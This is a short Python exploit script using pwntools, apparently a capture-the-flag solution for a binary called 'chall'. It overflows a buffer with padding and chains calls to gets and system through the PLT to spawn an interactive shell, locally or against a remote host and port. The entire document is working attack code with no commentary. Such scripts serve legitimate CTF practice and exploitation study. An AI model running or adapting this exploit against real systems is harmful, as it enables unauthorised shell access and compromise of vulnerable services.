#!/usr/bin/env python3

from pwn import context, p64, remote, sys

context.binary = 'chall'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


io = get_process()

payload  = b'A' * 0x18
payload += p64(context.binary.plt.gets)
payload += p64(context.binary.plt.system)

io.sendlineafter(b'Enter something:\n', payload)
io.sendline(b'sh \0')
io.interactive()
